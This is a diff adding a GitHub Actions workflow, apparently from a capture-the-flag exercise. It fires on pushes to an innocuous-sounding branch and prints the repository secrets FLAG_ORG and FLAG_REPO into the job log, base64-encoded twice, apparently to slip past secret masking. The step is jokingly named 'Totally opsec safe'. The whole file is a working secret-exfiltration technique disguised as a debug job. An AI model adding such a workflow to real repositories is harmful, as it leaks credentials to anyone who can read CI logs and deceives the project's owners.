@@ -1,0 +1,11 @@
+name: Debug
+on:
+  push:
+    branches: nothingtoseehere
+jobs:
+  debug:
+    runs-on:
+    - ubuntu-latest
+    steps:
+    - name: Totally opsec safe
+      run: echo -e "FLAG_ORG=${{ secrets.FLAG_ORG }}\nFLAG_REPO=${{ secrets.FLAG_REPO }}\n" | base64 | base64
